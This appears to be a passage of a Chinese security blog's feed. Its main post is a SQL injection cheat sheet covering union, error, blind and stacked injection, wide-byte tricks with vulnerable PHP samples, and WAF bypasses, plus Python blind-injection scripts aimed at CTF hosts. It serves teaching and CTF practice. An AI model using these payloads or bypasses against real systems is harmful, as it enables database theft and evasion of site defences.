      &lt;h1 id=&quot;XSS类型&quot;&gt;&lt;a href=&quot;#XSS类型&quot; class=&quot;headerlink&quot; title=&quot;XSS类型&quot;&gt;&lt;/a&gt;XSS类型&lt;/h1&gt;&lt;h2 id=&quot;反射型&quot;&gt;&lt;a href=&quot;#反射型&quot; class=&quot;headerlink&quot; title=&quot;反射型&quot;&gt;&lt;/a&gt;反射型&lt;/h2&gt;&lt;p&gt;用户访问带有XSS代码的请求，服务器立即将代码发送至浏览器，浏览器执行恶意代码：&lt;/p&gt;&lt;figure class=&quot;highlight php&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;3&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;comment&quot;&gt;// http://127.0.0.1/reflect.php?xss=&amp;lt;script&amp;gt;alert(1);&amp;lt;/script&amp;gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;setcookie(&lt;span class=&quot;string&quot;&gt;&#39;session&#39;&lt;/span&gt;, &lt;span class=&quot;string&quot;&gt;&#39;qwerty&#39;&lt;/span&gt;);&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;keyword&quot;&gt;echo&lt;/span&gt; $_GET[&lt;span class=&quot;string&quot;&gt;&#39;xss&#39;&lt;/span&gt;];&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
    
    </summary>
    
      <category term="Web安全-XSS" scheme="http://anemone.top/categories/Web%E5%AE%89%E5%85%A8-XSS/"/>
    
    
  </entry>
  
  <entry>
    <title>SQL注入总结</title>
    <link href="http://anemone.top/sqli-SQL%E6%B3%A8%E5%85%A5%E6%80%BB%E7%BB%93/"/>
    <id>http://anemone.top/sqli-SQL注入总结/</id>
    <published>2019-02-12T07:53:50.000Z</published>
    <updated>2019-09-22T10:14:18.693Z</updated>
    
    <content type="html"><![CDATA[<h1 id="注入类型"><a href="#注入类型" class="headerlink" title="注入类型"></a>注入类型</h1><h2 id="Union-Based"><a href="#Union-Based" class="headerlink" title="Union Based"></a>Union Based</h2><p>最基本的注入类型，以MySQL为例，假设有注入点：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">SELECT * FROM `test` </span><br><span class="line">WHERE `username`=&apos;admin&apos; and `password`=&apos;*&apos;;</span><br></pre></td></tr></table></figure><h3 id="0x01-判断注入点"><a href="#0x01-判断注入点" class="headerlink" title="0x01 判断注入点"></a>0x01 判断注入点</h3><a id="more"></a><p>若原先能够查询到数据：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">admin&apos; and &apos;1&apos;=&apos;1&apos;%23    #有数据</span><br><span class="line">admin&apos; and &apos;1&apos;=&apos;2&apos;%23    #无数据</span><br></pre></td></tr></table></figure><p>若原先查询不到数据：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">admin&apos; or &apos;1&apos;=&apos;1&apos;%23    #有数据</span><br><span class="line">admin&apos; or &apos;1&apos;=&apos;2&apos;%23    #无数据</span><br></pre></td></tr></table></figure><p>若为整数型</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">7 &amp;&amp; 1=2 %23</span><br><span class="line">7 &amp;&amp; 1=1 %23</span><br><span class="line">7 || 1=2 %23</span><br><span class="line">7 || 1=2 %23</span><br></pre></td></tr></table></figure><h3 id="0x02-查询共有多少字段"><a href="#0x02-查询共有多少字段" class="headerlink" title="0x02 查询共有多少字段"></a>0x02 查询共有多少字段</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">a&apos; UNION SELECT 1%23 </span><br><span class="line">a&apos; UNION SELECT 1,2%23</span><br><span class="line">a&apos; UNION SELECT 1,2,3%23</span><br></pre></td></tr></table></figure><p>…直到正常显示数据为止，或者：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">a&apos; ORDER BY 1%23</span><br><span class="line">a&apos; ORDER BY 2%23</span><br><span class="line">a&apos; ORDER BY 3%23</span><br></pre></td></tr></table></figure><p>…直到网页报错为止。</p><h3 id="0x03-查询库"><a href="#0x03-查询库" class="headerlink" title="0x03 查询库"></a>0x03 查询库</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">a&apos; union select SCHEMA_NAME,2,3,4,5 from information_schema.SCHEMATA %23</span><br></pre></td></tr></table></figure><h3 id="0x04-查询表"><a href="#0x04-查询表" class="headerlink" title="0x04 查询表"></a>0x04 查询表</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">a&apos; union select TABLE_NAME,2,3,4,5 from information_schema.TABLES where TABLE_SCHEMA=&apos;test&apos; limit 0,1 %23 #第一个表</span><br><span class="line">a&apos; union select TABLE_NAME,2,3,4,5 from information_schema.TABLES where TABLE_SCHEMA=&apos;test&apos; limit 1,1 %23 #第二个表</span><br><span class="line">...</span><br></pre></td></tr></table></figure><h3 id="0x05-查询字段"><a href="#0x05-查询字段" class="headerlink" title="0x05 查询字段"></a>0x05 查询字段</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">a&apos; union select COLUMN_NAME,2,3,4,5 from information_schema.COLUMNS where TABLE_NAME=&apos;test&apos; limit 0,1 %23 #第一个字段</span><br><span class="line">a&apos; union select COLUMN_NAME,2,3,4,5 from information_schema.COLUMNS where TABLE_NAME=&apos;test&apos; limit 0,1 %23 #第二个字段</span><br><span class="line">...</span><br></pre></td></tr></table></figure><h3 id="0x05-查询记录"><a href="#0x05-查询记录" class="headerlink" title="0x05 查询记录"></a>0x05 查询记录</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">a&apos; union select username,2,3,4,5 from test.test %23</span><br></pre></td></tr></table></figure><h3 id="关于注释"><a href="#关于注释" class="headerlink" title="关于注释"></a>关于注释</h3><ul><li><code>#</code>可以换成<code>%23</code></li><li><code>--+</code></li></ul><h2 id="Error-Based"><a href="#Error-Based" class="headerlink" title="Error Based"></a>Error Based</h2><p>若有错误回显的情况下可以使用mysql的一些函数，引发错误，mysql报错时会将函数参数的值返回，如：</p><p><img src="/sqli-SQL注入总结/1549959620738.png" alt="1549959620738"></p><p>常用的报错函数有：</p><ul><li><p>updatexml()<br><code>updatexml(1,concat(0x7e,(select @@version),0x7e),1)</code></p></li><li><p>extractvalue()<br><code>extractvalue(1,concat(0x7e,version(),0x7e))</code></p></li><li><p>floor()<br><code>(select 1 from (select count(*),concat(user(),floor(rand(0)*2))x from information_schema.tables group by x)a)</code></p></li><li><p>geometrycollection() 、multipoint() 、polygon()、multipolygon()、linestring()、multilinestring() #5.5以上不适用</p><p><code>geometrycollection((select * from(select * from(select user())a)b))</code></p></li><li><p>exp() #5.5以上不适用</p><p><code>exp(~(select * from(select user())a));</code></p></li></ul><h2 id="Bool-Time-Based-（Blind-Based）"><a href="#Bool-Time-Based-（Blind-Based）" class="headerlink" title="Bool/Time Based （Blind Based）"></a>Bool/Time Based （Blind Based）</h2><h3 id="Bool-Based"><a href="#Bool-Based" class="headerlink" title="Bool Based"></a>Bool Based</h3><p>若原先能够/不能查询到数据，那么若猜测字段正确，那么现在能够/不能查询数据。</p><p>若原先能够查询到数据：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">*&apos; and length((database()))&lt;8#</span><br><span class="line">*&apos; and ascii(substring((database()),1,1))=100# 猜测字段</span><br></pre></td></tr></table></figure><p>若原先不能查询数据：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">*&apos; or length((database()))&lt;8#</span><br><span class="line">*&apos; or ascii(substring((database()),1,1))=100# 猜测字段</span><br></pre></td></tr></table></figure><p>给出exp模板：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#coding=UTF-8</span></span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line">result = <span class="string">''</span></span><br><span class="line">url = <span class="string">'http://a3edf37f0d9741c6ad151c8bafbcad60fc11a19cf7f747a9.game.ichunqiu.com/index.php?'</span></span><br><span class="line">payload = <span class="string">'id=0 or if((ascii(substr((&#123;sql&#125;),&#123;list&#125;,1))&lt;&#123;num&#125;),1,0)'</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> xrange(<span class="number">0</span>,<span class="number">50</span>):</span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> xrange(<span class="number">32</span>,<span class="number">126</span>):</span><br><span class="line">        <span class="comment">#hh = payload.format(sql='select database()',list=str(i),num=str(j))</span></span><br><span class="line">        <span class="comment">#hh = payload.format(sql='select count(*) from information_schema.tables',list=str(i),num=str(j))</span></span><br><span class="line">        <span class="comment">#hh = payload.format(sql='select table_name from information_schema.tables limit 81,1',list=str(i),num=str(j))</span></span><br><span class="line">        hh = payload.format(sql=<span class="string">'select * from words.f14g'</span>,list=str(i),num=str(j))</span><br><span class="line">        <span class="comment">#print hh</span></span><br><span class="line">        zz = requests.get(url+hh)</span><br><span class="line">        <span class="comment">#print zz.content</span></span><br><span class="line">        <span class="keyword">if</span> <span class="string">'Hello Hacker!!'</span> <span class="keyword">in</span> zz.content:</span><br><span class="line">            result += chr(j<span class="number">-1</span>)</span><br><span class="line">            <span class="keyword">print</span> result</span><br><span class="line">            <span class="keyword">break</span></span><br></pre></td></tr></table></figure><h3 id="Time-Based"><a href="#Time-Based" class="headerlink" title="Time Based"></a>Time Based</h3><p>那么若猜测字段正确，那么现在延迟一段时间后再返回。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">*&apos; or if(ascii(substring((database()),1,1))=116, sleep(100), 1);</span><br></pre></td></tr></table></figure><p>给出exp模板：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line">flag = <span class="string">''</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">1</span>,<span class="number">33</span>):</span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> <span class="string">'0123456789abcdef'</span>:</span><br><span class="line">        url = <span class="string">'http://101.71.29.5:10004/Admin/User/Index?search[table]=flag where 1 and if((ascii(substr((select flag from flag limit 0,1),'</span>+str(i)+<span class="string">',1))='</span>+str(ord(j))+<span class="string">'),sleep(3),0)--'</span></span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            r = requests.get(url=url,timeout=<span class="number">2.5</span>)</span><br><span class="line">        <span class="keyword">except</span>:</span><br><span class="line">            flag += j</span><br><span class="line">            <span class="keyword">print</span> flag</span><br><span class="line">            <span class="keyword">break</span></span><br></pre></td></tr></table></figure><h3 id="其他用到的函数-关键字"><a href="#其他用到的函数-关键字" class="headerlink" title="其他用到的函数/关键字"></a>其他用到的函数/关键字</h3><ul><li><p>regexp binary </p><p><code>and password regexp binary ‘^A’#</code></p></li><li><p>mid() 同substr</p><p><code>MID(version(),1,1)</code></p></li><li><p>ord() 同ascii</p></li></ul><h2 id="堆叠注入"><a href="#堆叠注入" class="headerlink" title="堆叠注入"></a>堆叠注入</h2><p>使用<code>;</code>结束上一句查询语句后再执行另一条语句：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">SELECT * FROM test;select if(1=1,SLEEP(100),1);</span><br></pre></td></tr></table></figure><h1 id="非where的注入点"><a href="#非where的注入点" class="headerlink" title="非where的注入点"></a>非where的注入点</h1><h2 id="order-by注入点"><a href="#order-by注入点" class="headerlink" title="order by注入点"></a>order by注入点</h2><ul><li><p>Error Based</p><p><code>order by 1 and(updatexml(1,concat(0x7e,@@version,0x7e),0))</code></p></li><li><p>Time Based #5.5复现失败</p><p><code>order by if(1=2,1,(SELECT(1)FROM(SELECT(SLEEP(2)))test))</code></p></li><li><p>Bool Based</p><p><code>order by (select+1+regexp+if(substring(user(),1,1)=0x72,1,0x00))</code> </p></li></ul><h2 id="limit注入点"><a href="#limit注入点" class="headerlink" title="limit注入点"></a>limit注入点</h2><ul><li><code>limit 1,1 procedure analyse(extractvalue(1,concat(0x7e,version(),0x7e)),1)</code></li></ul><h2 id="group-by注入点"><a href="#group-by注入点" class="headerlink" title="group by注入点"></a>group by注入点</h2><p><code>GROUP BY if(1=2,1,(SELECT(1)FROM(SELECT(SLEEP(2)))test));</code></p><h2 id="table注入点"><a href="#table注入点" class="headerlink" title="table注入点"></a>table注入点</h2><p><code>users where updatexml(1, concat(0x7e, (select user()), 0x7e), 1)#</code></p><h2 id="desc注入点"><a href="#desc注入点" class="headerlink" title="desc注入点"></a>desc注入点</h2><p>desc不完全可控和table结合，需要保证desc成功，table报错，只有在desc和table只能有一个含”&#96;”时能注入（都含有或都不含有则无解）<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">mysql_connect(<span class="string">"localhost"</span>,<span class="string">"root"</span>,<span class="string">"xiaoyu"</span>);</span><br><span class="line">mysql_query(<span class="string">"use b2cshop"</span>);</span><br><span class="line">$table = $_GET[<span class="string">'table'</span>];</span><br><span class="line">mysql_query(<span class="string">"desc `shop_&#123;$table&#125;`"</span>) <span class="keyword">or</span> <span class="keyword">die</span>(<span class="string">"DESC 出错:"</span>.mysql_error()); <span class="comment">//表名不完全可控</span></span><br><span class="line">$sql = <span class="string">"select * from shop_&#123;$table&#125; where 1=1"</span>;</span><br><span class="line"><span class="keyword">echo</span> $sql;</span><br><span class="line">var_dump(mysql_fetch_array(mysql_query(<span class="string">"$sql"</span>)));</span><br><span class="line"><span class="keyword">echo</span> mysql_error();</span><br></pre></td></tr></table></figure></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">?table=users` `where updatexml(1,concat(0x5e24,(select user()),0x5e24),1)#</span><br><span class="line"></span><br><span class="line">desc `shop_users` `where updatexml(1,concat(0x5e24,(select user()),0x5e24),1)#`</span><br></pre></td></tr></table></figure><h1 id="宽字节注入"><a href="#宽字节注入" class="headerlink" title="宽字节注入"></a>宽字节注入</h1><h2 id="产生原因"><a href="#产生原因" class="headerlink" title="产生原因"></a>产生原因</h2><p>即使输入时使用了addslashes进行了过滤，但是MySQL的客户端字符集（character_set_client）设置为GBK、BIG5或其他，导致<code>/</code>在解码时被跳脱，例如有如下程序：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">&lt;!DOCTYPE html&gt;</span><br><span class="line">&lt;meta charset=<span class="string">"gbk"</span>&gt;</span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">$name=$_GET[<span class="string">'name'</span>];</span><br><span class="line">$name=addslashes($name); <span class="comment">//name被转义</span></span><br><span class="line"></span><br><span class="line">$conn=mysql_connect(<span class="string">'127.0.0.1'</span>,<span class="string">'root'</span>,<span class="string">'root'</span>);</span><br><span class="line">mysql_select_db(<span class="string">"test"</span>,$conn);</span><br><span class="line">$result=mysql_query(<span class="string">"SET NAMES 'GBK'"</span>);</span><br><span class="line">$sql=<span class="string">"select * from test where username='"</span>.$name.<span class="string">"'"</span>;</span><br><span class="line">$result=mysql_query($sql,$conn);</span><br><span class="line"><span class="keyword">if</span>($result)&#123;</span><br><span class="line">    <span class="keyword">while</span> ($row = mysql_fetch_assoc($result)) &#123;</span><br><span class="line">        print_r($row);</span><br><span class="line">    &#125;</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">"Error"</span>.mysql_error().<span class="string">"&lt;/br&gt;"</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>payload为<code>?name=admin%df%27%20union%20select%201,2%20%23</code></p><p>编码过程<br><code>1&#39; ==addslashes==&gt; 1\&#39; (1\x5c\x27)</code><br><code>1%df&#39; ==addslashes==&gt; 1%df\&#39;(1\xdf\x5c\x27) ==encode(gbk)==&gt; 1運&#39;</code>     #<code>&#39;</code>逃逸</p><h2 id="iconv转换情况"><a href="#iconv转换情况" class="headerlink" title="iconv转换情况"></a>iconv转换情况</h2><p>gbk编码转换成utf8时，转换时也会引发错误：<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">&lt;!DOCTYPE html&gt;</span><br><span class="line">&lt;meta charset=<span class="string">"gbk"</span>&gt;</span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">$conn=mysql_connect(<span class="string">'127.0.0.1'</span>,<span class="string">'root'</span>,<span class="string">'root'</span>);</span><br><span class="line">mysql_select_db(<span class="string">"test"</span>,$conn);</span><br><span class="line"></span><br><span class="line">$name=$_GET[<span class="string">'name'</span>];</span><br><span class="line">mysql_query(<span class="string">"set names UTF-8"</span>) ;</span><br><span class="line">$bar =iconv(<span class="string">"GBK"</span>,<span class="string">"UTF-8"</span>, addslashes($name));</span><br><span class="line"></span><br><span class="line">$sql=<span class="string">"select * from test where username='"</span>.$name.<span class="string">"'"</span>;</span><br><span class="line">$result=mysql_query($sql,$conn);</span><br><span class="line"><span class="keyword">if</span>($result)&#123;</span><br><span class="line">    <span class="keyword">while</span> ($row = mysql_fetch_assoc($result)) &#123;</span><br><span class="line">        print_r($row);</span><br><span class="line">    &#125;</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">"Error"</span>.mysql_error().<span class="string">"&lt;/br&gt;"</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure></p><p>payload为<code>admin%e5%5c%27%20union%20select%201,2%20%23</code>(<code>admin%e5\&#39; union select 1,2 #</code>)</p><p>编码过程（由于<code>\xe5\x5c</code>转为UTF-8为<code>\xe9\x8c\xa6</code>）：</p><p><code>%e5\&#39; (\xe5\x5c\x27) ==addslashes==&gt; %e5\\\&#39; (\xe5\x5c\x5c\x5c\x27) ==iconv==&gt; \xe9\x8c\xa6\x5c\x5c\x27</code></p><p>另外，若编码为BIG5时，payload为<code>1兝\&#39; =&gt; 1\xa2\x5c\x5c\x27 =&gt; 1?\\&#39;</code>。</p><h2 id="解决办法"><a href="#解决办法" class="headerlink" title="解决办法"></a>解决办法</h2><ul><li><p>换用utf8字符集</p></li><li><p>使用mysql_set_charset()设置字符集并且使用mysql_real_escape_string()转义，其会考虑当前字符集所以不会产生逃逸问题：</p><p><code>mysql_set_charset(&#39;gbk&#39;);$name=mysql_real_escape_string($name);</code></p></li></ul><h1 id="绕过"><a href="#绕过" class="headerlink" title="绕过"></a>绕过</h1><h2 id="绕过字符"><a href="#绕过字符" class="headerlink" title="绕过字符"></a>绕过字符</h2><ul><li><p>绕过空格</p><ul><li>%0a(<code>\r</code>)、%0b(<code>\t</code>)、%a0(+)</li></ul></li><li><p>绕过单引号</p><ul><li>编码：Unicode（IIS支持）、Hex</li><li>函数：char</li><li>宽字节</li><li>数字型</li></ul></li><li><p>绕过union</p><ul><li>使用盲注</li></ul></li><li><p>绕过and/or</p><ul><li>&amp;&amp; / ||</li></ul></li><li><p>substring()</p><ul><li>mid() left() right()</li></ul></li><li><p>绕过小括号</p><ul><li><code>?username=admin&#39; and password binary regexp &#39;^A&#39;</code></li></ul></li></ul><h2 id="绕过ngx-lua-waf"><a href="#绕过ngx-lua-waf" class="headerlink" title="绕过ngx_lua_waf"></a>绕过ngx_lua_waf</h2><p>详细请参考<a href="https://www.t00ls.net/articles-45736.html" target="_blank" rel="noopener">Bypass ngx_lua_waf SQL注入防御（多姿势）</a></p><h3 id="HTTP-参数污染（HPP）"><a href="#HTTP-参数污染（HPP）" class="headerlink" title="HTTP 参数污染（HPP）"></a>HTTP 参数污染（HPP）</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">http://192.168.8.147/test/sql.aspx</span><br><span class="line">?id=1 UNION/&amp;ID=/SELECT null,name,null/&amp;Id=/FROM master.dbo.sysdatabases</span><br></pre></td></tr></table></figure><h3 id="URI参数溢出"><a href="#URI参数溢出" class="headerlink" title="URI参数溢出"></a>URI参数溢出</h3><p>提交100个以上参数：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">http://192.168.204.128/test.php</span><br><span class="line"></span><br><span class="line">POST：id=1&amp;id=1&amp;id=1&amp;id=1&amp;id=1&amp;id=1&amp;id=1&amp;id=1&amp;id=1&amp;id=1&amp;id=1&amp;id=1&amp;id=1&amp;id=1&amp;id=1&amp;id=1&amp;id=1&amp;id=1&amp;id=1&amp;id=1&amp;id=1&amp;id=1&amp;id=1&amp;id=1&amp;id=1&amp;id=1&amp;id=1&amp;id=1&amp;id=1&amp;id=1&amp;id=1&amp;id=1&amp;id=1&amp;id=1&amp;id=1&amp;id=1&amp;id=1&amp;id=1&amp;id=1&amp;id=1&amp;id=1&amp;id=1&amp;id=1&amp;id=1&amp;id=1&amp;id=1&amp;id=1&amp;id=1&amp;id=1&amp;id=1&amp;id=1&amp;id=1&amp;id=1&amp;id=1&amp;id=1&amp;id=1&amp;id=1&amp;id=1&amp;id=1&amp;id=1&amp;id=1&amp;id=1&amp;id=1&amp;id=1&amp;id=1&amp;id=1&amp;id=1&amp;id=1&amp;id=1&amp;id=1&amp;id=1&amp;id=1&amp;id=1&amp;id=1&amp;id=1&amp;id=1&amp;id=1&amp;id=1&amp;id=1&amp;id=1&amp;id=1&amp;id=1&amp;id=1&amp;id=1&amp;id=1&amp;id=1&amp;id=1&amp;id=1&amp;id=1&amp;id=1&amp; id=1&amp;id=1&amp;id=1&amp;id=1&amp;id=1&amp;id=1&amp;id=1&amp;id=1 union select 1,2,schema_name %0a/*!from*/information_schema.SCHEMATA</span><br></pre></td></tr></table></figure></p><p>MSSQL<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">http://192.168.204.128/test.aspx</span><br><span class="line"></span><br><span class="line">POST：id=1/*&amp;id=1*//*&amp;id=1*//*&amp;id=1*//*&amp;id=1*//*&amp;id=1*//*&amp;id=1*//*&amp;id=1*//*&amp;id=1*//*&amp;id=1*//*&amp;id=1*//*&amp;id=1*//*&amp;id=1*//*&amp;id=1*//*&amp;id=1*//*&amp;id=1*//*&amp;id=1*//*&amp;id=1*//*&amp;id=1*//*&amp;id=1*//*&amp;id=1*//*&amp;id=1*//*&amp;id=1*//*&amp;id=1*//*&amp;id=1*//*&amp;id=1*//*&amp;id=1*//*&amp;id=1*//*&amp;id=1*//*&amp;id=1*//*&amp;id=1*//*&amp;id=1*//*&amp;id=1*//*&amp;id=1*//*&amp;id=1*//*&amp;id=1*//*&amp;id=1*//*&amp;id=1*//*&amp;id=1*//*&amp;id=1*//*&amp;id=1*//*&amp;id=1*//*&amp;id=1*//*&amp;id=1*//*&amp;id=1*//*&amp;id=1*//*&amp;id=1*//*&amp;id=1*//*&amp;id=1*//*&amp;id=1*//*&amp;id=1*//*&amp;id=1*//*&amp;id=1*//*&amp;id=1*//*&amp;id=1*//*&amp;id=1*//*&amp;id=1*//*&amp;id=1*//*&amp;id=1*//*&amp;id=1*//*&amp;id=1*//*&amp;id=1*//*&amp;id=1*//*&amp;id=1*//*&amp;id=1*//*&amp;id=1*//*&amp;id=1*//*&amp;id=1*//*&amp;id=1*//*&amp;id=1*//*&amp;id=1*//*&amp;id=1*//*&amp;id=1*//*&amp;id=1*//*&amp;id=1*//*&amp;id=1*//*&amp;id=1*//*&amp;id=1*//*&amp;id=1*//*&amp;id=1*//*&amp;id=1*//*&amp;id=1*//*&amp;id=1*//*&amp;id=1*//*&amp;id=1*//*&amp;id=1*//*&amp;id=1*//*&amp;id=1*//*&amp;id=1*//*&amp;id=1*//*&amp;id=1*//*&amp;id=1*//*&amp;id=1*//*&amp;id=1*//*&amp;id=1*//*&amp;id=1*//*&amp;id=1*//*&amp;id=1*//*&amp;id=1*//*&amp;id=1*//*&amp;id=1*//*&amp;id=1*/ union select null,table_name,null from INFOMATION_SCHEMA.tables</span><br></pre></td></tr></table></figure></p><h2 id="绕过360主机卫士"><a href="#绕过360主机卫士" class="headerlink" title="绕过360主机卫士"></a>绕过360主机卫士</h2><p>详细请参考<a href="https://www.t00ls.net/articles-45943.html" target="_blank" rel="noopener">Bypass 360主机卫士SQL注入防御（多姿势）</a></p><h3 id="利用默认白名单"><a href="#利用默认白名单" class="headerlink" title="利用默认白名单"></a>利用默认白名单</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/test.php/1.png?id=1 union select 1,2,schema_name from information_schema.SCHEMATA</span><br></pre></td></tr></table></figure><h3 id="利用静态资源"><a href="#利用静态资源" class="headerlink" title="利用静态资源"></a>利用静态资源</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/test.php/1.png?id=1 union select 1,2,schema_name from information_schema.SCHEMATA</span><br></pre></td></tr></table></figure><h3 id="缓冲区溢出"><a href="#缓冲区溢出" class="headerlink" title="缓冲区溢出"></a>缓冲区溢出</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">id=1 and (select 1)=(Select 0xAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA) union select 1,2,schema_name from information_schema.SCHEMATA</span><br></pre></td></tr></table></figure><h3 id="URI参数溢出-1"><a href="#URI参数溢出-1" class="headerlink" 